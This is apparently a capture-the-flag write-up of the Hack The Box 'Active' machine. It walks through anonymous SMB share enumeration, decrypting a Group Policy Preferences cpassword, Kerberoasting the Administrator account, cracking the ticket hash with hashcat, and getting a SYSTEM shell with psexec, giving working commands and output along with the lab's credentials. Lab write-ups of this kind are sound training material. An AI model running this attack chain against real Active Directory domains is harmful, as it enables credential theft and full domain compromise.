# HTB - Active

## Services:

### Microsoft DNS

The **Domain Name System (DNS)** serves as the internet's directory, allowing users to access websites through **easy-to-remember domain names** like google.com or facebook.com, instead of the numeric Internet Protocol (IP) addresses. By translating domain names into IP addresses, the DNS ensures web browsers can quickly load internet resources, simplifying how we navigate the online world.

**Default port:** 53

```
PORT     STATE SERVICE  REASON
53/tcp   open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
5353/udp open  zeroconf udp-response
53/udp   open  domain  Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
```

### Microsoft Kerberos

**Kerberos** operates on a principle where it authenticates users without directly managing their access to resources. This is an important distinction because it underlines the protocol's role in security frameworks.

In environments like **Active Directory**, **Kerberos** is instrumental in establishing the identity of users by validating their secret passwords. This process ensures that each user's identity is confirmed before they interact with network resources. However, **Kerberos** does not extend its functionality to evaluate or enforce the permissions a user has over specific resources or services. Instead, it provides a secure way of authenticating users, which is a critical first step in the security process.

After authentication by **Kerberos**, the decision-making process regarding access to resources is delegated to individual services within the network. These services are then responsible for evaluating the authenticated user's rights and permissions, based on the information provided by **Kerberos** about the user's privileges. This design allows for a separation of concerns between authenticating the identity of users and managing their access rights, enabling a more flexible and secure approach to resource management in distributed networks.

**Default Port:** 88/tcp/udp

```
PORT   STATE SERVICE
88/tcp open  kerberos-sec
```
### MSRPC

The microsoft remote procedure call (MSRPC) protocol, a client-server model enabling a program to request a service from a program located on another computer without understanding the network's specifics, was initially derived from open-source software and later developed and copyrighted by microsoft.

The RPC endpoint mapper can be accessed via TCP and UDP port 135,SMB on TCP 139 and 445 (with a null or authenticated session), and as a web service on TCP port 593.

### Netbios-ssn

The Network Basic Input Output System (NetBIOS) is a software protocol designed to enable applications, PCs, and Desktops within a local area network (LAN) to interact with network hardware and facilitate the transmission of data across the network. 

The identification and location of software applications operating on a NetBIOS network are achieved through their NetBIOS names, which can be up to 16 characters in length and are often distinct from the computer name.

A netbios session between two applications is initiated when one application (acting as the client) issues a command to "call" another application (acting as the server) utilizing TCP PORT 139.

Technically, Port 139 is referred to as ‘NBT over IP’, whereas Port 445 is identified as ‘SMB over IP’. The acronym **SMB** stands for ‘**Server Message Blocks**’, which is also modernly known as the **Common Internet File System (CIFS)**. As an application-layer network protocol, SMB/CIFS is primarily utilized to enable shared access to files, printers, serial ports, and facilitate various forms of communication between nodes on a network.

For example, in the context of Windows, it is highlighted that SMB can operate directly over TCP/IP, eliminating the necessity for NetBIOS over TCP/IP, through the utilization of port 445. Conversely, on different systems, the employment of port 139 is observed, indicating that SMB is being executed in conjunction with NetBIOS over TCP/IP.

```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

### LDAP

The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

LDAP directories are structured to allow their distribution across several servers, with each server housing a replicated and synchronized version of the directory, referred to as a Directory System Agent (DSA). Responsibility for handling requests lies entirely with the LDAP server, which may communicate with other DSAs as needed to deliver a unified response to the requester.

The LDAP directory's organization resembles a tree hierarchy, starting with the root directory at the top. This branches down to countries, which further divide into organizations, and then to organizational units representing various divisions or departments, finally reaching the individual entities level, including both people and shared resources like files and printers.

`Default port: 389 and 636(ldaps). Global Catalog (LDAP in ActiveDirectory) is available by default on ports 3268, and 3269 for LDAPS.`

### kpasswd5

`464/tcp   open  kpasswd5?`

The fact you're seeing this service and port suggests you may be scanning a Domain Controller, for which both UDP & TCP ports 464 are used by the Kerberos Password Change. This port in particular is used for changing/setting passwords against Active Directory.


## Question 1: How many SMB shares are shared by the target?

First I see on the nmap results this line :

`3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)

Which indicates that the domain name of the Active Directory is `active.htb`.
So I add this domain to my hosts file : 

`sudo echo "10.10.10.100 active.htb" >> /etc/hosts`

Then I use a tool called smbclient to enumerate the shares on the AD: 

```
smbclient -L //active.htb
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\karys]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available 
```

So the number of SMB shares is 7 

### Question 2: What is the name of the share that allows anonymous read access?

I tried to connect to the shares with `smbclient` via the command:

```
smbclient //active.htb/ADMIN$
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\karys]:
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

And the only share that I can access is Replication : 

```
smbclient //active.htb/Replication
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\karys]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```

### Question 3: Which file has encrypted accounts credentials in it ?

First I download the files on my computer:

```
smb: \active.htb\> RECURSE ON
smb: \active.htb\> PROMPT OFF
smb: \active.htb\> mget *
```

Then I navigate them and I found: 

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Which gives me a username : `SVC_TGS` and an encrypted password : `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

This file is located on : 

`Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`

### Question 4: What is the decrpyted password for the SVC_TGS account?

I searched on google: `Preferences Groups.xml` and found this article: 

https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp

The first thing I learned was that Groups.xml is usually stored on SYSVOL, so the Replication share is a duplicate of SYSVOL.

And then I learned that the cpassword was encrypted with AES using a 32-bit key available on windows documentations: 

```
 4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
 f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```

Doing a little bit of research I found a tool : gpp-decrypt on github:

https://github.com/t0thkr1s/gpp-decrypt

And I used it to find the password : 

```
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/home/Karys/Hacking/gpp-decrypt/gpp-decrypt.py:10: SyntaxWarning: invalid escape sequence '\ '
  banner = '''

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Password: GPPstillStandingStrong2k18
```

The password is : `GPPstillStandingStrong2k18`

### Question 5: Submit the flag located on the security user's desktop.

I use smbclient with the found credentials to connect to the Users share :

`smbclient //active.htb/Users -U SVC_TGS%GPPstillStandingStrong2k18`

I found the user.txt file in the SVC_TGS's desktop and retrieved it using the mget command :

```
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 17:14:42 2018
  ..                                  D        0  Sat Jul 21 17:14:42 2018
  user.txt                           AR       34  Sat Jul 13 14:57:56 2024

		5217023 blocks of size 4096. 278838 blocks available
smb: \SVC_TGS\Desktop\> mget user.txt
Get file user.txt? yes
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> 
```

### Question 6: Which service account on Active is vulnerable to Kerberoasting ?

First I need to learn about Kerberoasting.

#### Kerberoast

Kerberoasting focuses on the acquisition of **TGS tickets**, specifically those related to services operating under **user accounts** in **Active Directory (AD)**, excluding **computer accounts**. The encryption of these tickets utilizes keys that originate from **user passwords**, allowing for the possibility of **offline credential cracking**. The use of a user account as a service is indicated by a non-empty **"ServicePrincipalName"** property.

For executing **Kerberoasting**, a domain account capable of requesting **TGS tickets** is essential; however, this process does not demand **special privileges**, making it accessible to anyone with **valid domain credentials**.

##### Key Points:

- **Kerberoasting** targets **TGS tickets** for **user-account services** within **AD**.
    
- Tickets encrypted with keys from **user passwords** can be **cracked offline**.
    
- A service is identified by a **ServicePrincipalName** that is not null.
    
- **No special privileges** are needed, just **valid domain credentials**.

#### TGS tickets

A Ticket Granting Service (TGS) ticket is a part of the Kerberos authentication protocol used for network authentication. The TGS ticket, also known as a service ticket, is issued by the Ticket Granting Server (TGS) within the Kerberos Key Distribution Center (KDC).

I watched a video here:
https://www.youtube.com/watch?v=ZoGoBCviu6w

And used the GetUserSPNs.py from impacket to get this output:

```
(pythonvenv) ┌─[karys@TxY] - [~] - [Sat Jul 13, 17:45]
└─[$] <> GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18      
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  ----------------------------------
----------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2024-07-13 14:57:57.942948             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6aee383619f5373c07286fec905286a5$60897b393c6eb09e98b99f3227a7cdd69c84c91d922a97453de879fa293d65edc4c3c8f7f6329d7a0e5d64965b9f8a45543761a12e5cc9028a7eaaf7b034f448cda6471ffd2cb6b23da96b89d99f6285766bed8e11c06de9ea726ad0b8db3d7956a94b58f5eee9a6571ff12bf2a74e1308390c86d97cc13fd3e2321ecc3d9e8978fa625df97d85daf342ce175d7cfc960975888e0589d326e6bdf90b2134f416026984b60b8dedc78ce62bc8bd3012959d13698a6798897866cd4245cc3f58aebe10f41e453ec638cee5ae4738bc8e0f62c6930a6e3a7410d205f0e236a747faa6267458a305b8641449e146f9998482b0bf2257db8cbed296a6a7cbfdb0f78b8a3c1ac81ad2bc53aa10cad4ea542a1189495d9cce245d04a4561220c543c160d8bca46753a5b07b1a232c984df2ded2a283d85a6ece17aa34db473d6b3b600c43b76f7b9f6544d1460a6fe1468a9169f380b419205afcce2d5604ab44062a17e367be35f637b9fa3de55418eacdad3dd324429ebc0ceefe35c336cf3bfac1a70aa422f9b042cf56c922fe7dcccca24c0160db2346558a64a90d99f9da7d001df53e29600af429c8e30d432e777f0ce1dd5c26f8b81c25ddb280423d07f66521501899512c2779968fa21f843765179230c204a9e20fd586707ed2956293ac9d97071c31f1a5225cce4d72f3a2ad1493e4f21c7fa629a3c5d855dcc22272b7748042c81e5297060c9d35bb6d046f5c93c3556496b6f013c63c9a578eafcf27c1b18eefdb90434efc9deb931b8809c6f5817bf625e7e9ef01329bb14c8124027c98385886100630427a5be9507282c2b4a03143bfeb0701c51afae73ddde13925ab266c6c3a2ce6f1338286fe8c2481289220224b865d9ef7ee834a3a3d1f11315e3141d83f53678fa347267c009ed5e5b4a379eadce4c33c102418e47ace43c09b111677bf8d1628db21d509d102c582df6497c70ebc23a1ede87ba794d07392104b773eb8fd3feaca62b2a1f55000b21b141c515e13a87a3ecc7cc79e2d0a06dbcda44d5d1c4879842a05227c0d7160afd3cef4b577b328abddba15aad7203c8a7d332a1a1fa778209b2e6fe5883f5c7255d57847894cffbd4c6251ee9823a99f2b03cef2fe9c7aa089871a91369c96cf9ada9126fce5d4a482dd9d6f835855db0e98a00a80c252cdcd0cd3da27ecdea1a181be2bd89f2ee2a93fba57b6947581fd0d9119e80c166679f27fed625dc93d317acfea436658d1fd
```

So the service account that is vulnerable to Kerberoasting is `Administrator`

### Question 7: What is the plaintext password for the administrator account?

So earlier we obtained the Administrator TGS and I saved it as administrator.tgs :

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6aee383619f5373c07286fec905286a5$60897b393c6eb09e98b99f3227a7cdd69c84c91d922a97453de879fa293d65edc4c3c8f7f6329d7a0e5d64965b9f8a45543761a12e5cc9028a7eaaf7b034f448cda6471ffd2cb6b23da96b89d99f6285766bed8e11c06de9ea726ad0b8db3d7956a94b58f5eee9a6571ff12bf2a74e1308390c86d97cc13fd3e2321ecc3d9e8978fa625df97d85daf342ce175d7cfc960975888e0589d326e6bdf90b2134f416026984b60b8dedc78ce62bc8bd3012959d13698a6798897866cd4245cc3f58aebe10f41e453ec638cee5ae4738bc8e0f62c6930a6e3a7410d205f0e236a747faa6267458a305b8641449e146f9998482b0bf2257db8cbed296a6a7cbfdb0f78b8a3c1ac81ad2bc53aa10cad4ea542a1189495d9cce245d04a4561220c543c160d8bca46753a5b07b1a232c984df2ded2a283d85a6ece17aa34db473d6b3b600c43b76f7b9f6544d1460a6fe1468a9169f380b419205afcce2d5604ab44062a17e367be35f637b9fa3de55418eacdad3dd324429ebc0ceefe35c336cf3bfac1a70aa422f9b042cf56c922fe7dcccca24c0160db2346558a64a90d99f9da7d001df53e29600af429c8e30d432e777f0ce1dd5c26f8b81c25ddb280423d07f66521501899512c2779968fa21f843765179230c204a9e20fd586707ed2956293ac9d97071c31f1a5225cce4d72f3a2ad1493e4f21c7fa629a3c5d855dcc22272b7748042c81e5297060c9d35bb6d046f5c93c3556496b6f013c63c9a578eafcf27c1b18eefdb90434efc9deb931b8809c6f5817bf625e7e9ef01329bb14c8124027c98385886100630427a5be9507282c2b4a03143bfeb0701c51afae73ddde13925ab266c6c3a2ce6f1338286fe8c2481289220224b865d9ef7ee834a3a3d1f11315e3141d83f53678fa347267c009ed5e5b4a379eadce4c33c102418e47ace43c09b111677bf8d1628db21d509d102c582df6497c70ebc23a1ede87ba794d07392104b773eb8fd3feaca62b2a1f55000b21b141c515e13a87a3ecc7cc79e2d0a06dbcda44d5d1c4879842a05227c0d7160afd3cef4b577b328abddba15aad7203c8a7d332a1a1fa778209b2e6fe5883f5c7255d57847894cffbd4c6251ee9823a99f2b03cef2fe9c7aa089871a91369c96cf9ada9126fce5d4a482dd9d6f835855db0e98a00a80c252cdcd0cd3da27ecdea1a181be2bd89f2ee2a93fba57b6947581fd0d9119e80c166679f27fed625dc93d317acfea436658d1fd
```

This can be cracked with hashcat with the command:

`sudo hashcat -m 13100 administrator.tgs /usr/share/seclists/rockyou.txt`

And we obtain:

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$6aee383619f5373c07286fec905286a5$60897b393c6eb09e98b99f3227a7cdd69c84c91d922a97453de879fa293d65edc4c3c8f7f6329d7a0e5d64965b9f8a45543761a12e5cc9028a7eaaf7b034f448cda6471ffd2cb6b23da96b89d99f6285766bed8e11c06de9ea726ad0b8db3d7956a94b58f5eee9a6571ff12bf2a74e1308390c86d97cc13fd3e2321ecc3d9e8978fa625df97d85daf342ce175d7cfc960975888e0589d326e6bdf90b2134f416026984b60b8dedc78ce62bc8bd3012959d13698a6798897866cd4245cc3f58aebe10f41e453ec638cee5ae4738bc8e0f62c6930a6e3a7410d205f0e236a747faa6267458a305b8641449e146f9998482b0bf2257db8cbed296a6a7cbfdb0f78b8a3c1ac81ad2bc53aa10cad4ea542a1189495d9cce245d04a4561220c543c160d8bca46753a5b07b1a232c984df2ded2a283d85a6ece17aa34db473d6b3b600c43b76f7b9f6544d1460a6fe1468a9169f380b419205afcce2d5604ab44062a17e367be35f637b9fa3de55418eacdad3dd324429ebc0ceefe35c336cf3bfac1a70aa422f9b042cf56c922fe7dcccca24c0160db2346558a64a90d99f9da7d001df53e29600af429c8e30d432e777f0ce1dd5c26f8b81c25ddb280423d07f66521501899512c2779968fa21f843765179230c204a9e20fd586707ed2956293ac9d97071c31f1a5225cce4d72f3a2ad1493e4f21c7fa629a3c5d855dcc22272b7748042c81e5297060c9d35bb6d046f5c93c3556496b6f013c63c9a578eafcf27c1b18eefdb90434efc9deb931b8809c6f5817bf625e7e9ef01329bb14c8124027c98385886100630427a5be9507282c2b4a03143bfeb0701c51afae73ddde13925ab266c6c3a2ce6f1338286fe8c2481289220224b865d9ef7ee834a3a3d1f11315e3141d83f53678fa347267c009ed5e5b4a379eadce4c33c102418e47ace43c09b111677bf8d1628db21d509d102c582df6497c70ebc23a1ede87ba794d07392104b773eb8fd3feaca62b2a1f55000b21b141c515e13a87a3ecc7cc79e2d0a06dbcda44d5d1c4879842a05227c0d7160afd3cef4b577b328abddba15aad7203c8a7d332a1a1fa778209b2e6fe5883f5c7255d57847894cffbd4c6251ee9823a99f2b03cef2fe9c7aa089871a91369c96cf9ada9126fce5d4a482dd9d6f835855db0e98a00a80c252cdcd0cd3da27ecdea1a181be2bd89f2ee2a93fba57b6947581fd0d9119e80c166679f27fed625dc93d317acfea436658d1fd:Ticketmaster1968
```

So the administrator password is: `Ticketmaster1968`

### Question 8: Submit the flag located on the administrator's desktop.

I used the psexec.py from impacket to get a shell as Administrator with the command:

`psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100`

Then I moved to the Desktop with the command: 

`C:\Users> cd C:\Users\Administrator\Desktop`

And read the root.txt flag with these commands:

`C:\Users\Administrator\Desktop> dir`

`C:\Users\Administrator\Desktop> type root.txt`
